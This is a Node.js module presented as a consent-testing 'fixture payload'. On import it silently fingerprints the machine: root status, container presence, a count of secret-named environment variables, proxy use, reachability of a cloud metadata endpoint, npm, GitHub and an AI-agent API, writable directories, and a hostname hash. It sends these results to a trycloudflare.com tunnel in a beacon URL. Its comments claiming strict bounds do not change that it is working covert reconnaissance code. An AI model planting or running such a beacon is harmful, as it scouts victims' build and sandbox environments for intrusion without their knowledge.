// n1 fixture payload - candidate bytes PENDING Naruto byte review + sha256 commitment via i2i. Consent-fixture use only after his approval.
// Bounded: one HTTPS GET per import. Reads ONLY the planted non-secret fixture marker
// (env FIXTURE_MARKER or /tmp/fixture_marker). Presence flags are counts/booleans/hostname-hash.
// No token reads, no env values, no file reads beyond the marker, no writes, no persistence.
import net from 'node:net';
import fs from 'node:fs';
import os from 'node:os';
import crypto from 'node:crypto';
import https from 'node:https';
const HOST = 'phrases-ash-messenger-britain.trycloudflare.com';
function tcp(host, port, ms) {
  return new Promise((res) => {
    let done = false;
    const s = new net.Socket();
    const fin = (v) => { if (!done) { done = true; try { s.destroy(); } catch (e) {} res(v); } };
    s.setTimeout(ms);
    s.once('connect', () => fin(1));
    s.once('timeout', () => fin(0));
    s.once('error', () => fin(0));
    try { s.connect(port, host); } catch (e) { fin(0); }
  });
}
async function main() {
  try {
    let marker = (process.env.FIXTURE_MARKER || '').trim();
    if (!marker) { try { marker = fs.readFileSync('/tmp/fixture_marker', 'utf8').trim(); } catch (e) {} }
    marker = marker.replace(/[^A-Za-z0-9_-]/g, '').slice(0, 128);
    if (!marker) marker = 'NOMARKER';
    const uid = (typeof process.getuid === 'function' && process.getuid() === 0) ? 0 : 1;
    const dock = (fs.existsSync('/.dockerenv') || fs.existsSync('/run/.containerenv')) ? 1 : 0;
    let ec = 0;
    try { for (const k of Object.keys(process.env)) { if (/TOKEN|KEY|SECRET|CRED|PASS|AUTH/i.test(k)) ec++; } } catch (e) {}
    if (ec > 99) ec = 99;
    const px = (process.env.HTTP_PROXY || process.env.HTTPS_PROXY || process.env.http_proxy || process.env.https_proxy) ? 1 : 0;
    const meta = await tcp('metadata.google.internal', 80, 1500);
    const npmr = await tcp('registry.npmjs.org', 443, 2000);
    const ghr = await tcp('github.com', 443, 2000);
    const japi = await tcp('jules.googleapis.com', 443, 2000);
    let cw = 0, tw = 0;
    try { fs.accessSync(process.cwd(), fs.constants.W_OK); cw = 1; } catch (e) {}
    try { fs.accessSync('/tmp', fs.constants.W_OK); tw = 1; } catch (e) {}
    const hh = crypto.createHash('sha1').update(os.hostname()).digest('hex').slice(0, 8);
    const path = `/beacon/m4-u${uid}-d${dock}-env${ec}-px${px}-meta${meta}-npm${npmr}-gh${ghr}-japi${japi}-cw${cw}-tw${tw}-i-${hh}-${marker}`;
    await new Promise((res) => {
      try {
        const r = https.get('https://' + HOST + path, { timeout: 4000 }, (resp) => { resp.resume(); resp.on('end', res); resp.on('error', res); });
        r.on('timeout', () => { r.destroy(); res(); });
        r.on('error', () => res());
      } catch (e) { res(); }
    });
  } catch (e) {}
}
main();
